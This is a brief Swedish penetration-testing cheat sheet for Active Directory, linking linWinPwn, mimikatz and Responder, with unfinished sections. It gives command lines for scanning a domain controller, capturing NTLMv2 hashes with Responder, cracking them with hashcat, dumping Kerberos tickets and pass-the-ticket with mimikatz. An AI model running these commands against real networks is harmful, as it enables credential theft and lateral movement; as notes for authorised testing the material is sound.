# Gunnajs-Playbook
En svensk penetrationsvägvisare

## Tools bby

### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### mimikatz
https://github.com/ParrotSec/mimikatz
### Responder
https://github.com/lgandx/Responder
# VEV

## linWinPwn 
```bash
sudo ./linWinPwn.sh -t <Domän_Kontrollant_IP> -u <AD_konto> -p <AD_lösen>
```

## Zero Logon
* in the making *
## Responder
### Veva igång responder
```bash
responder -I eth0 -v
```
### Cracka NTLMv2 hashar
```bash
hashcat64.exe -m 5600 ntlm-hashes.txt <lösenlista.txt> -o cracked.txt
```

## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
## SMB VEV
* in the making *
## Nmap
* in the making *
